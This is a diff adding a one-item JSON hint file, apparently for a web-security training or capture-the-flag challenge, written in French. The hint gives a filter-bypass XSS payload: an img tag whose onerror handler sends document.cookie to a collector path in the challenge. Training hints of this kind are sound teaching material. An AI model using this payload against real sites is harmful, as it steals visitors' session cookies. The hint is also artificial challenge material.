@@ -1,0 +1,7 @@
+[
+  {
+    "title": "Bypass de filtre basique",
+    "cost": 10,
+    "content": "Si <script> est filtré, tente un vecteur d'événement comme <img src=\"invalid\" onerror=\"fetch('/targets/training/web-04/collector?c='+document.cookie)\">."
+  }
+]
